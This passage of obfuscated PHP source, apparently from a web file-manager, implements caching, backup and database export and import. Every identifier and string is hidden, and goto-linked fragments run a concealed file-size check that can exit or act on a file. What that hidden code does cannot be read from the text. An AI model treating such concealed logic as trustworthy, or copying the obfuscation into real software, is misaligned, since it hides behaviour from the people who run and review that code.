} if (IO::exist($¶‚•¥ß)) { return !0; } $©Ç¯´‰“ = get_path_father($¶‚•¥ß); if (IO::exist($©Ç¯´‰“)) { $Ù•Ïö¨¬[] = $Ùñàå…[$ö·ôïı‰[460]]; return !1; } $…üòÚ÷ = array($ö·ôïı‰[811] => $Ùñàå…[$ö·ôïı‰[811]], $ö·ôïı‰[78] => array($ö·ôïı‰[380], "{$©Ç¯´‰“}\45")); $‰¦ª£À– = Model($ö·ôïı‰[775])->where($…üòÚ÷)->field($ö·ôïı‰[461])->select(); $Ù•Ïö¨¬ = array_merge($Ù•Ïö¨¬, array_to_keyvalue($‰¦ª£À–, $ö·ôïı‰[12], $ö·ôïı‰[460])); return !1; } private function _fileFilter($òüÊ¨ÊÈ) { $…‹Â“¬˜ =& $_SERVER[ê‘³Æ±]; if (empty($òüÊ¨ÊÈ)) { return; } $ø´‰õ™ = array($…‹Â“¬˜[460] => array($…‹Â“¬˜[7], array_unique($òüÊ¨ÊÈ))); $øë¿±—Æ = Model($…‹Â“¬˜[819])->where($ø´‰õ™)->field($…‹Â“¬˜[396])->select(); foreach ($øë¿±—Æ as $•ñóå‚œ) { Model($…‹Â“¬˜[819])->remove($•ñóå‚œ[$…‹Â“¬˜[396]], !1); } } private function storeIds() { $şÕù‹£ª =& $_SERVER[ê‘³Æ±]; $ÌŸ»¢š = Model($şÕù‹£ª[753])->listData(); $‚¥‘ª ü = array(); $üŠÄî®† = $GLOBALS[$şÕù‹£ª[6]][$şÕù‹£ª[90]][$şÕù‹£ª[820]]; foreach ($ÌŸ»¢š as $Òş•£Ö) { $Öš¼Â‚‰ = strtolower($Òş•£Ö[$şÕù‹£ª[96]]); if (!isset($üŠÄî®†[$Öš¼Â‚‰])) { continue; } $ŸßÜèªŠ = $şÕù‹£ª[74] . (isset($üŠÄî®†[$Öš¼Â‚‰]) ? $üŠÄî®†[$Öš¼Â‚‰] : ucfirst($Öš¼Â‚‰)); if (!class_exists($ŸßÜèªŠ)) { continue; } $‚¥‘ª ü[] = $Òş•£Ö[$şÕù‹£ª[394]]; } return $‚¥‘ª ü; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $§şœç³ =& $_SERVER[ê‘³Æ±]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ÆÆ˜æŠ = $GLOBALS[$§şœç³[6]][$§şœç³[346]]; $ãúıĞÛ« = $ÆÆ˜æŠ[$ÆÆ˜æŠ[$§şœç³[821]]]; $ÇÑ”ğŒÉ = $ÆÆ˜æŠ[$§şœç³[822]]; switch ($ÆÆ˜æŠ[$§şœç³[821]]) { case $§şœç³[21]: self::$handle = Model($§şœç³[823]); break; case $§şœç³[824]: self::$handle = new CacheRedis($ãúıĞÛ«, $ÇÑ”ğŒÉ); break; case $§şœç³[825]: self::$handle = new CacheMemcached($ãúıĞÛ«, $ÇÑ”ğŒÉ); break; case $§şœç³[194]: self::$handle = new CacheFile($ãúıĞÛ«, $ÇÑ”ğŒÉ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ŸÖ§îÓà) { if (is_array($ŸÖ§îÓà) || is_object($ŸÖ§îÓà)) { $ŸÖ§îÓà = json_encode($ŸÖ§îÓà); } $ŸÖ§îÓà = rawurlencode($ŸÖ§îÓà); return md5(KOD_SITE_ID . $_SERVER[ê‘³Æ±][11] . $ŸÖ§îÓà); } public static function get($Ô¿Îõ«Œ, $¥ˆ©È–– = false) { $İ‘í¾åß = self::key($Ô¿Îõ«Œ); if ($¥ˆ©È––) { return unserialize(self::init()->get($İ‘í¾åß)); } if (!isset(self::$memoryCache[$İ‘í¾åß])) { $ıñÃ„ø° = self::init()->get($İ‘í¾åß); self::$memoryCache[$İ‘í¾åß] = unserialize($ıñÃ„ø°); } return self::$memoryCache[$İ‘í¾åß]; } public static function set($±Æå„¡, $î«È„×¨, $ÑŞ¹ùÍÄ = false) { $ˆ¶œâ› = self::key($±Æå„¡); if (isset(self::$memoryCache[$ˆ¶œâ›]) && self::$memoryCache[$ˆ¶œâ›] === $î«È„×¨) { return !0; } if ($ÑŞ¹ùÍÄ === 0) { self::$memoryCache[$ˆ¶œâ›] = $î«È„×¨; return !0; } CacheLock::lock($±Æå„¡); $ùûê°Ş = self::init()->set($ˆ¶œâ›, serialize($î«È„×¨), $ÑŞ¹ùÍÄ); self::$memoryCache[$ˆ¶œâ›] = $î«È„×¨; CacheLock::unlock($±Æå„¡); return $ùûê°Ş; } public static function getCall($úÉËÁãı, $‘ø¸ª¬‹, $Ğ˜»ÕÃË, $æİÇ„Èâ = array()) { $¤ÇšĞ· =& $_SERVER[ê‘³Æ±]; $üµËÒ…š = self::get($úÉËÁãı); if ($üµËÒ…š || $üµËÒ…š === $¤ÇšĞ·[12]) { return $üµËÒ…š; } $üµËÒ…š = call_user_func_array($Ğ˜»ÕÃË, $æİÇ„Èâ); $üµËÒ…š = $üµËÒ…š ? $üµËÒ…š : $¤ÇšĞ·[12]; self::set($úÉËÁãı, $üµËÒ…š, $‘ø¸ª¬‹); return $üµËÒ…š; } public static function remove($ì­æçı¾) { $³Í‘†ü¾ = self::key($ì­æçı¾); unset(self::$memoryCache[$³Í‘†ü¾]); self::clearTimeout(); CacheLock::lock($ì­æçı¾); $±¤”“Çë = self::init()->remove($³Í‘†ü¾); CacheLock::unlock($ì­æçı¾); return $±¤”“Çë; } public static function removeMemory($ÔÎîÂå) { $Ë¿ãß‡ñ = self::key($ÔÎîÂå); unset(self::$memoryCache[$Ë¿ãß‡ñ]); } public static function clearMemory($¥êç‚‚§ = false) { if ($¥êç‚‚§) { $¥êç‚‚§ = self::key($¥êç‚‚§); unset(self::$memoryCache[$¥êç‚‚§]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ê‘³Æ±][826])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ê‘³Æ±][827])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($†Ûîœô×, $ø«Ëú) { $Ã¦Ò”¸Ï =& $_SERVER[ê‘³Æ±]; $this->cachePath = $†Ûîœô×[$Ã¦Ò”¸Ï[78]]; $this->prefix = $Ã¦Ò”¸Ï[828]; $this->cacheTime = $ø«Ëú; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($© ï×ı) { $¸îµõÜ =& $_SERVER[ê‘³Æ±]; $© ï×ı = str_replace(array($¸îµõÜ[829], $¸îµõÜ[98], $¸îµõÜ[73]), $¸îµõÜ[830], $© ï×ı); return $this->cachePath . $¸îµõÜ[831] . $© ï×ı . $¸îµõÜ[832]; } public function set($ˆ¼ÃŸê», $·Şıó”ô, $õÅÙ ‚é = false) { $…Ãü÷®Å = $this->getFile($ˆ¼ÃŸê»); if (file_put_contents($…Ãü÷®Å, $this->prefix . $·Şıó”ô, LOCK_EX)) { @touch($…Ãü÷®Å, intval(time() + $õÅÙ ‚é)); clearstatcache(); return !0; } @unlink($…Ãü÷®Å); return !1; } public function get($§´¤…êÒ) { $‘³ö´‰ƒ = $this->getFile($§´¤…êÒ); if (file_exists($‘³ö´‰ƒ) && filemtime($‘³ö´‰ƒ) < time()) { @unlink($‘³ö´‰ƒ); return !1; } $·İÃã‰™ = @file_get_contents($‘³ö´‰ƒ); return substr($·İÃã‰™, strlen($this->prefix)); } public function remove($Ç’½Í¾) { $‚èâØœÓ = $this->getFile($Ç’½Í¾); return @unlink($‚èâØœÓ); } public function deleteAll() { $¥ÆÓ³è© =& $_SERVER[ê‘³Æ±]; $¥ã²Øµ = scandir($this->cachePath); foreach ($¥ã²Øµ as $Öö¸°) { $ùõÍ«‡È = $this->cachePath . $Öö¸°; if (strpos($ùõÍ«‡È, $¥ÆÓ³è©[832]) && strpos($ùõÍ«‡È, $¥ÆÓ³è©[833])) { @unlink($ùõÍ«‡È); } } } public function clearTimeout() { $—¦í¡ğ =& $_SERVER[ê‘³Æ±]; $üîöåÍ = scandir($this->cachePath); foreach ($üîöåÍ as $½‡„ëÛ) { $…œÃŠµô = $this->cachePath . $½‡„ëÛ; if (strpos($…œÃŠµô, $—¦í¡ğ[832]) && strpos($…œÃŠµô, $—¦í¡ğ[833]) && filemtime($…œÃŠµô) < time()) { @unlink($…œÃŠµô); } } } } goto FŠÃè†Šñ„; bƒ§¼«è©: $_file = $_SERVER[$_SERVER[ê‘³Æ±][784]]; $_size = $_SERVER[ê‘³Æ±][785]; if ($_SERVER[$_SERVER[ê‘³Æ±][786]] != $_size($_file)) { $_getc = $_SERVER[ê‘³Æ±][787]; $_getfile = $_SERVER[$_SERVER[ê‘³Æ±][788]] . $_SERVER[ê‘³Æ±][789]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ê‘³Æ±][228], $_getfilec); if (count($_getarrs) < $_SERVER[ê‘³Æ±][620]) { $exit = $_SERVER[ê‘³Æ±][790]; $exit(); } $_act = $_SERVER[ê‘³Æ±][791]; $_act($_file); } goto c°ŸÉ‡Â“ñ; E¬†‹¬„Çİ: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ÜÂúşæº =& $_SERVER[ê‘³Æ±]; $this->isManual(); self::$name = date($ÜÂúşæº[734]); if (!($ÊÎ£øŸ = Model($ÜÂúşæº[735])->lastItem())) { $ÊÎ£øŸ = $this->initData(); } else { self::$name = $ÊÎ£øŸ[$ÜÂúşæº[32]]; if ($ÊÎ£øŸ[$ÜÂúşæº[736]] == $ÜÂúşæº[89]) { self::$name = date($ÜÂúşæº[737]); $Ä†¡óæÊ = 0; if (isset($ÊÎ£øŸ[$ÜÂúşæº[290]][$ÜÂúşæº[194]][$ÜÂúşæº[460]])) { $Ä†¡óæÊ = (int) $ÊÎ£øŸ[$ÜÂúşæº[290]][$ÜÂúşæº[194]][$ÜÂúşæº[460]]; } if (self::$manual == 0 && $ÊÎ£øŸ[$ÜÂúşæº[32]] == self::$name) { Model($ÜÂúşæº[735])->remove($ÊÎ£øŸ[$ÜÂúşæº[394]]); } $ÊÎ£øŸ = $this->initData($Ä†¡óæÊ, $ÊÎ£øŸ[$ÜÂúşæº[738]]); } else { $this->checkStore($ÊÎ£øŸ[$ÜÂúşæº[738]]); } } self::$option = $ÊÎ£øŸ; } private function isManual() { $·ËìÂªÙ = _get($GLOBALS, $_SERVER[ê‘³Æ±][739], 0); $·ËìÂªÙ = intval($·ËìÂªÙ); self::$manual = $·ËìÂªÙ && $·ËìÂªÙ == 1 ? 1 : 0; } private function initData($ôÅ•Şåü = 0, $†‚÷áßı = '') { $É½ıƒÚÒ =& $_SERVER[ê‘³Æ±]; $ÔªŒòƒÔ = Model($É½ıƒÚÒ[735])->config(); if ($†‚÷áßı && $ÔªŒòƒÔ[$É½ıƒÚÒ[738]] != $†‚÷áßı) { $ôÅ•Şåü = 0; } $this->checkStore($ÔªŒòƒÔ[$É½ıƒÚÒ[738]]); if (self::$manual == 1) { self::$name .= $É½ıƒÚÒ[11] . date($É½ıƒÚÒ[740]); } $âåş•Áˆ = array($É½ıƒÚÒ[738] => $ÔªŒòƒÔ[$É½ıƒÚÒ[738]], $É½ıƒÚÒ[32] => self::$name, $É½ıƒÚÒ[736] => 0, $É½ıƒÚÒ[741] => $ÔªŒòƒÔ[$É½ıƒÚÒ[741]], $É½ıƒÚÒ[742] => self::$manual, $É½ıƒÚÒ[290] => array($É½ıƒÚÒ[743] => array($É½ıƒÚÒ[736] => 0), $É½ıƒÚÒ[744] => array($É½ıƒÚÒ[736] => 0, $É½ıƒÚÒ[745] => 0, $É½ıƒÚÒ[746] => 0, $É½ıƒÚÒ[33] => $É½ıƒÚÒ[12], $É½ıƒÚÒ[747] => 0, $É½ıƒÚÒ[489] => 0), $É½ıƒÚÒ[748] => array($É½ıƒÚÒ[736] => 0, $É½ıƒÚÒ[745] => 0, $É½ıƒÚÒ[746] => 0, $É½ıƒÚÒ[747] => 0, $É½ıƒÚÒ[489] => 0), $É½ıƒÚÒ[194] => array($É½ıƒÚÒ[736] => 0, $É½ıƒÚÒ[749] => 0, $É½ıƒÚÒ[750] => 0, $É½ıƒÚÒ[751] => 0, $É½ıƒÚÒ[752] => 0, $É½ıƒÚÒ[460] => $ôÅ•Şåü, $É½ıƒÚÒ[747] => 0, $É½ıƒÚÒ[489] => 0)), $É½ıƒÚÒ[747] => time(), $É½ıƒÚÒ[489] => 0); $™æœÉÉ‚ = Model($É½ıƒÚÒ[735])->insert($âåş•Áˆ); $âåş•Áˆ[$É½ıƒÚÒ[394]] = $™æœÉÉ‚; return $âåş•Áˆ; } private function checkStore($·‚»Õ­) { $¯’Œ—ÆÈ =& $_SERVER[ê‘³Æ±]; $„Ùã¡æÜ = Model($¯’Œ—ÆÈ[753])->listData($·‚»Õ­); Model($¯’Œ—ÆÈ[753])->checkConfig($„Ùã¡æÜ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ê‘³Æ±][735])->findByName(self::$name); } return self::$option; } public static function set($ö¬Šè¸¦) { $¸Å“ĞÂ† =& $_SERVER[ê‘³Æ±]; $áÕ‰•„ = self::get(); foreach ($ö¬Šè¸¦ as $ôàŸŒ¸ => $Ø‡«¦Î) { $Ï÷™òß¿ = explode($¸Å“ĞÂ†[10], $ôàŸŒ¸); $°¿ß©© = count($Ï÷™òß¿); switch ($°¿ß©©) { case 1: $áÕ‰•„[$Ï÷™òß¿[0]] = $Ø‡«¦Î; break; case 2: $áÕ‰•„[$Ï÷™òß¿[0]][$Ï÷™òß¿[1]] = $Ø‡«¦Î; break; case 3: $áÕ‰•„[$Ï÷™òß¿[0]][$Ï÷™òß¿[1]][$Ï÷™òß¿[2]] = $Ø‡«¦Î; break; } } Model($¸Å“ĞÂ†[735])->update($áÕ‰•„[$¸Å“ĞÂ†[394]], $áÕ‰•„); self::$option = $áÕ‰•„; return self::$option; } public function keep() { $ğöÓñ´ =& $_SERVER[ê‘³Æ±]; $ò¡°ê´õ = self::get(); if ($ò¡°ê´õ[$ğöÓñ´[290]][$ğöÓñ´[743]][$ğöÓñ´[736]] == $ğöÓñ´[89]) { return; } $this->backupKeep($ò¡°ê´õ); self::set(array($ğöÓñ´[754] => 1)); } private function backupKeep($øàÃÃÚ€) { $Š¡‰Ÿ¦Ñ =& $_SERVER[ê‘³Æ±]; if (self::$manual == 1) { return; } $Ø¾´£äà = Model($Š¡‰Ÿ¦Ñ[735])->listData(); if (empty($Ø¾´£äà)) { return; } $Ì­”à Ö = 0; $ÊÔ‰¯Ëì = array(); foreach ($Ø¾´£äà as $ùËÚŸĞë) { if ($Ì­”à Ö >= 7) { break; } $ÊÔ‰¯Ëì[] = $ùËÚŸĞë[$Š¡‰Ÿ¦Ñ[32]]; $Ì­”à Ö++; } for ($Ì­”à Ö = 0; $Ì­”à Ö < 12; $Ì­”à Ö++) { $ÊÔ‰¯Ëì[] = date($Š¡‰Ÿ¦Ñ[755], strtotime("\x2d{$Ì­”à Ö}\x20\155\157\x6e\164\x68\163")); } $ÊÔ‰¯Ëì = array_unique($ÊÔ‰¯Ëì); $‡¬úÃ = Model($Š¡‰Ÿ¦Ñ[756])->get($Š¡‰Ÿ¦Ñ[757]); foreach ($Ø¾´£äà as $ùËÚŸĞë) { if (isset($ùËÚŸĞë[$Š¡‰Ÿ¦Ñ[742]]) && $ùËÚŸĞë[$Š¡‰Ÿ¦Ñ[742]] == $Š¡‰Ÿ¦Ñ[89]) { continue; } if (!empty($ùËÚŸĞë[$Š¡‰Ÿ¦Ñ[32]]) && in_array($ùËÚŸĞë[$Š¡‰Ÿ¦Ñ[32]], $ÊÔ‰¯Ëì)) { continue; } Model($Š¡‰Ÿ¦Ñ[735])->remove($ùËÚŸĞë[$Š¡‰Ÿ¦Ñ[394]]); $×Í’¾õ¡ = $this->backupPath($øàÃÃÚ€, $‡¬úÃ); IO::remove($×Í’¾õ¡, !1); } } private function backupPath($»™úÆ›ü, $İíÛ˜ı¼ = false) { $°’¶”é‘ =& $_SERVER[ê‘³Æ±]; if (!$İíÛ˜ı¼) { $İíÛ˜ı¼ = Model($°’¶”é‘[756])->get($°’¶”é‘[757]); } $šÚœï…³ = $»™úÆ›ü[$°’¶”é‘[32]]; $²éÁ‚Òš = substr(md5($°’¶”é‘[758] . $İíÛ˜ı¼ . $šÚœï…³), 0, 8); return "\x7b\x69\157\x3a{$»™úÆ›ü[$°’¶”é‘[738]]}\x7d\57\x64\x61\x74\x61\142\x61\163\145\x2f\x62\141\143\153\165\160\x2f" . $šÚœï…³ . $°’¶”é‘[11] . $²éÁ‚Òš; } public function db() { $öÓ¥ô—× =& $_SERVER[ê‘³Æ±]; $Ë‰åì®ä = self::get(); if ($Ë‰åì®ä[$öÓ¥ô—×[290]][$öÓ¥ô—×[744]][$öÓ¥ô—×[736]] == $öÓ¥ô—×[89]) { return !0; } $é Øş¬Ö = new BackupDb(); if (!$é Øş¬Ö->index()) { return !1; } self::set(array($öÓ¥ô—×[759] => 1)); return !0; } public function dbFile() { $¬¹¿¿ë½ =& $_SERVER[ê‘³Æ±]; $ãÙïƒõ¦ = self::get(); if ($ãÙïƒõ¦[$¬¹¿¿ë½[290]][$¬¹¿¿ë½[748]][$¬¹¿¿ë½[736]] == $¬¹¿¿ë½[89]) { return !0; } $æ¡×Í‡„ = new BackupDbFile(); if (!$æ¡×Í‡„->index()) { return !1; } self::set(array($¬¹¿¿ë½[760] => 1)); return !0; } public function file() { $•®¦ß =& $_SERVER[ê‘³Æ±]; $¢ò˜šş = self::get(); if ($¢ò˜šş[$•®¦ß[290]][$•®¦ß[194]][$•®¦ß[736]] == $•®¦ß[89]) { return !0; } if (!isset($¢ò˜šş[$•®¦ß[741]]) || $¢ò˜šş[$•®¦ß[741]] == $•®¦ß[192]) { $šŒÎêäÆ = new BackupFile(); if (!$šŒÎêäÆ->index()) { return !1; } } self::set(array($•®¦ß[761] => 1, $•®¦ß[736] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $º›”áç =& $_SERVER[ê‘³Æ±]; $»¿šÕ = Backup::get(); self::$io = $»¿šÕ[$º›”áç[738]]; self::$name = $»¿šÕ[$º›”áç[32]]; $ı£õŠÇ¸ = new DbManage(); $øó²øÕ® = $ı£õŠÇ¸->dbType(); $¹ªë¬”§ = array($º›”áç[762] => $øó²øÕ®, $º›”áç[763] => time()); Backup::set($¹ªë¬”§); $Ù²îİí¯ = $this->tmpFilesPath() . $º›”áç[764] . self::$name . $º›”áç[8]; del_dir($Ù²îİí¯); mk_dir($Ù²îİí¯); $•¿‰®ş¿ = $©Å­éÄ = 0; $‘—»ùÚ€ = new Task($º›”áç[765], $º›”áç[766], 0, LNG($º›”áç[767]) . $º›”áç[768] . LNG($º›”áç[769])); try { $ä½²Ä·İ = $ı£õŠÇ¸->db()->getTables(); } catch (Exception $İôÆ¦â£) { $‘—»ùÚ€->end(); return !1; } $ä½²Ä·İ = array_diff($ä½²Ä·İ, array($º›”áç[770], $º›”áç[771])); foreach ($ä½²Ä·İ as $ç…ıÀŒï) { $•¿‰®ş¿ += $ı£õŠÇ¸->model($ç…ıÀŒï)->count(); } $‘—»ùÚ€->task[$º›”áç[772]] = $•¿‰®ş¿; $GLOBALS[$º›”áç[773]] = self::$name; foreach ($ä½²Ä·İ as $ç…ıÀŒï) { $÷¸¡ŠŸÅ = $Ù²îİí¯ . $ç…ıÀŒï . $º›”áç[774]; $Ë²±–ÙÃ = null; if ($ç…ıÀŒï == $º›”áç[775] && (!isset($»¿šÕ[$º›”áç[741]]) || $»¿šÕ[$º›”áç[741]] == $º›”áç[192])) { $Ë²±–ÙÃ = self::$io; } $©Å­éÄ += $ı£õŠÇ¸->sqlFromDb($ç…ıÀŒï, $÷¸¡ŠŸÅ, $‘—»ùÚ€, $Ë²±–ÙÃ); } unset($GLOBALS[$º›”áç[773]]); $‘—»ùÚ€->end(); if ($©Å­éÄ > $•¿‰®ş¿) { $•¿‰®ş¿ = $©Å­éÄ; } $¹ªë¬”§ = array($º›”áç[762] => $øó²øÕ®, $º›”áç[759] => 1, $º›”áç[776] => $•¿‰®ş¿, $º›”áç[777] => $©Å­éÄ, $º›”áç[778] => time()); Backup::set($¹ªë¬”§); if ($•¿‰®ş¿ - $©Å­éÄ > 0) { $é¢òûÑŠ = $º›”áç[779]; if (stristr(I18n::getType(), $º›”áç[780])) { $é¢òûÑŠ = $º›”áç[781]; } write_log(array($é¢òûÑŠ, $¹ªë¬”§), $º›”áç[766]); return !1; } return !0; } private function tmpFilesPath() { $ı¸Œ£´³ =& $_SERVER[ê‘³Æ±]; $¼“ÆÔŞ = TEMP_FILES; if ($GLOBALS[$ı¸Œ£´³[6]][$ı¸Œ£´³[90]][$ı¸Œ£´³[782]]) { $¼“ÆÔŞ = $GLOBALS[$ı¸Œ£´³[6]][$ı¸Œ£´³[90]][$ı¸Œ£´³[782]]; if (!mk_dir($¼“ÆÔŞ) || !is_writable($¼“ÆÔŞ) || !IO::mkfile($¼“ÆÔŞ . $ı¸Œ£´³[783])) { $¼“ÆÔŞ = TEMP_FILES; } } return $¼“ÆÔŞ; } } $_file = $_SERVER[$_SERVER[ê‘³Æ±][784]]; goto A‰¶×Å…; Cª¡æÅ­˜Ş: class DbManage { function __construct($áœòÕ­à = array()) { $ô³ù¨™£ =& $_SERVER[ê‘³Æ±]; if (empty($áœòÕ­à)) { $áœòÕ­à = $GLOBALS[$ô³ù¨™£[6]][$ô³ù¨™£[21]]; } $this->database = $áœòÕ­à; } public function model($é¡’Ÿæğ = '') { return new ModelBase($é¡’Ÿæğ, $_SERVER[ê‘³Æ±][12], $this->database); } public function db($úÇŸ†Ÿ» = false) { $¤’èê¹‡ =& $_SERVER[ê‘³Æ±]; $¥Š´£ = array_change_key_case($this->database); if ($this->dbType() == $¤’èê¹‡[13] || !$úÇŸ†Ÿ») { return $this->model()->db(); } $í™·şı = $¥Š´£[$¤’èê¹‡[961]]; $¥Š´£[$¤’èê¹‡[961]] = $¤’èê¹‡[12]; if ($¥Š´£[$¤’èê¹‡[956]] == $¤’èê¹‡[953]) { $ªËÓš¤© = $¥Š´£[$¤’èê¹‡[962]]; $¥Š´£[$¤’èê¹‡[962]] = substr($ªËÓš¤©, 0, strrpos($ªËÓš¤©, $¤’èê¹‡[1048])); } $this->database = $¥Š´£; $Ã™ëî¢ = $this->model()->db(); try { $Ş‘Ş•Ì = $Ã™ëî¢->execute("\163\x68\157\x77\40\x64\x61\164\x61\142\x61\x73\x65\163\40\154\151\153\145\40\x27{$í™·şı}\47"); } catch (Exception $ÇôÉÖ×Ô) { } if (!$Ş‘Ş•Ì) { $Ã™ëî¢->execute("\x63\x72\x65\141\x74\x65\40\144\x61\x74\141\x62\x61\163\x65\40\140{$í™·şı}\140"); } $¥Š´£[$¤’èê¹‡[961]] = $í™·şı; if ($¥Š´£[$¤’èê¹‡[956]] == $¤’èê¹‡[953]) { $¥Š´£[$¤’èê¹‡[962]] .= $¤’èê¹‡[1048] . $í™·şı; } $this->database = $¥Š´£; $Ã™ëî¢->execute("\165\x73\x65\x20\x60{$í™·şı}\140"); return $Ã™ëî¢; } public function createTable($İÈšµ¼, &$Ûõ«À Ë) { $¿îÔŠÒş =& $_SERVER[ê‘³Æ±]; if (!IO::exist($İÈšµ¼)) { ActionCall($¿îÔŠÒş[1049], !0, 0); show_json(LNG($¿îÔŠÒş[1050]), !1); } $Ôç·èé‡ = $this->model()->db(); $ÔêØ· = sqlSplit(IO::getContent($İÈšµ¼)); foreach ($ÔêØ· as $ñ½»óæ) { $¼…¹½‹© = stripos($ñ½»óæ, $¿îÔŠÒş[1051]) === 0; if ($¼…¹½‹©) { $Ûõ«À Ë->task[$¿îÔŠÒş[772]] += 1; } $Ôç·èé‡->execute($ñ½»óæ); if ($¼…¹½‹©) { preg_match($¿îÔŠÒş[1052], $ñ½»óæ, $Ü‡¤Ÿ·º); $Ûõ«À Ë->task[$¿îÔŠÒş[1053]] = $Ü‡¤Ÿ·º[1]; $Ûõ«À Ë->update(1); } } } public function insertTable($ÏèêÆÓ’, &$¯­ù²ƒù) { $¯éÔÁ•Ç =& $_SERVER[ê‘³Æ±]; $—›‘¬Š = $this->model()->db(); $îÕã¸¾´ = $ñ×í¡ç ? array($ñ×í¡ç) : $—›‘¬Š->getTables(); foreach ($ÏèêÆÓ’ as $ô­õñ¹Å) { $ñ×í¡ç = basename($ô­õñ¹Å, $¯éÔÁ•Ç[774]); if (!in_array($ñ×í¡ç, $îÕã¸¾´)) { continue; } $¯­ù²ƒù->task[$¯éÔÁ•Ç[1053]] = $ñ×í¡ç; if (get_filesize($ô­õñ¹Å) == 0) { continue; } $§’æ€Î¯ = $this->sqlToDb($ô­õñ¹Å, $¯­ù²ƒù); if (!$§’æ€Î¯) { ActionCall($¯éÔÁ•Ç[1049], !0, 0); show_json(LNG($¯éÔÁ•Ç[1054]) . "\x5b{$ñ×í¡ç}\135", !1); } } } public function sqlFromDb($³×ØŒñİ, $ äÑ²áÏ, &$”Ë²À’¨, $ƒ±€¢ŠÅ = '') { if ($”Ë²À’¨) { $”Ë²À’¨->task[$_SERVER[ê‘³Æ±][1053]] = $³×ØŒñİ; } $½±¸ß©’ = $this->model($³×ØŒñİ); $”ª²Ãëæ = 0; $â¬‚Úì = 0; $Ğæ¿×ÖÀ = 10000; $¯¦´Œ‘ = fopen($ äÑ²áÏ, $_SERVER[ê‘³Æ±][1055]); $„—¿Û¹ô = $½±¸ß©’->getPk(); $¾Î¶Ÿ·¿ = $½±¸ß©’->getDbFields(); $òõ¦†î = $_SERVER[ê‘³Æ±][12]; if ($GLOBALS[$_SERVER[ê‘³Æ±][773]] && in_array($³×ØŒñİ, array($_SERVER[ê‘³Æ±][1056], $_SERVER[ê‘³Æ±][1057]))) { $òõ¦†î = $³×ØŒñİ; } do { $Â×äö€ = array($„—¿Û¹ô => array($_SERVER[ê‘³Æ±][1003], $â¬‚Úì)); $³±ø—œÑ = $½±¸ß©’->where($Â×äö€)->field($¾Î¶Ÿ·¿)->order($„—¿Û¹ô . $_SERVER[ê‘³Æ±][1058])->limit($Ğæ¿×ÖÀ)->select(); $³±ø—œÑ = !empty($³±ø—œÑ) ? $³±ø—œÑ : array(); if (!($ØÌˆÕ‡” = count($³±ø—œÑ))) { break; } $¹Â‚ü®ˆ = end($³±ø—œÑ); $â¬‚Úì = $¹Â‚ü®ˆ[$„—¿Û¹ô]; $¯©ùëØ® = array(); foreach ($³±ø—œÑ as $¡ùéÖ“…) { if ($òõ¦†î) { if ($³×ØŒñİ == $_SERVER[ê‘³Æ±][1056]) { if ($¡ùéÖ“…[$_SERVER[ê‘³Æ±][33]] == $_SERVER[ê‘³Æ±][1059]) { $Àˆ«¿Á± = json_decode($¡ùéÖ“…[$_SERVER[ê‘³Æ±][371]], !0); if ($Àˆ«¿Á±[$_SERVER[ê‘³Æ±][32]] == $GLOBALS[$_SERVER[ê‘³Æ±][773]] && $Àˆ«¿Á±[$_SERVER[ê‘³Æ±][736]] != 1) { continue; } } } else { if ($¡ùéÖ“…[$_SERVER[ê‘³Æ±][33]] == $_SERVER[ê‘³Æ±][1060] && $¡ùéÖ“…[$_SERVER[ê‘³Æ±][95]] == $_SERVER[ê‘³Æ±][765]) { continue; } } } if ($ƒ±€¢ŠÅ) { $¡ùéÖ“…[$_SERVER[ê‘³Æ±][78]] = "\173\x69\157\72{$ƒ±€¢ŠÅ}\x7d" . substr($¡ùéÖ“…[$_SERVER[ê‘³Æ±][78]], strlen("\173\151\157\72{$¡ùéÖ“…[$_SERVER[ê‘³Æ±][811]]}\175")); $¡ùéÖ“…[$_SERVER[ê‘³Æ±][811]] = $ƒ±€¢ŠÅ; } $¯©ùëØ®[] = $_SERVER[ê‘³Æ±][1061] . $this->sqlEncode($¡ùéÖ“…) . $_SERVER[ê‘³Æ±][1062]; } $­å¡ÆÇÍ = "\111\116\123\x45\122\x54\40\111\x4e\x54\x4f\x20\140{$³×ØŒñİ}\x60\x20\50\x60" . implode($_SERVER[ê‘³Æ±][1063], $¾Î¶Ÿ·¿) . $_SERVER[ê‘³Æ±][1064]; fwrite($¯¦´Œ‘, $­å¡ÆÇÍ . implode($_SERVER[ê‘³Æ±][1065], $¯©ùëØ®) . $_SERVER[ê‘³Æ±][71] . PHP_EOL); $”ª²Ãëæ += $ØÌˆÕ‡”; if ($”Ë²À’¨) { $”Ë²À’¨->update($ØÌˆÕ‡”); } } while ($Ğæ¿×ÖÀ == $ØÌˆÕ‡”); fclose($¯¦´Œ‘); return $”ª²Ãëæ; } public function sqlToDb($î’Äú®Í, &$†öÇëÇ©) { $ñ¹€ÕÑõ =& $_SERVER[ê‘³Æ±]; $šª……… = $this->model()->db(); $›¥»ã—— = @fopen($î’Äú®Í, $ñ¹€ÕÑõ[1066]); if (!$›¥»ã——) { return !1; } $ ÍÌŠî = 0; $­·¼Á“Ó = $ñ¹€ÕÑõ[12]; $İ¿‘¾´Ë = array(); $òßìöÍœ = $this->dbType(); $Ÿ˜ŞØ‡µ = $òßìöÍœ == $ñ¹€ÕÑõ[13] ? 500 : 2000; $èÚÓïäÉ = basename($î’Äú®Í, $ñ¹€ÕÑõ[774]); $÷¼È·†û = 0; $ã‹ÙĞ—ª = 4194304 - 104858; $Ñ‚»—íº = 1000000 - 104858; while (!feof($›¥»ã——)) { $¢éšéÜ« = trim(fgets($›¥»ã——)); if (!$¢éšéÜ«) { continue; } $‡ÕÏ¬š = $this->sqlDecode($¢éšéÜ«, $òßìöÍœ, $èÚÓïäÉ); if (stripos($‡ÕÏ¬š, 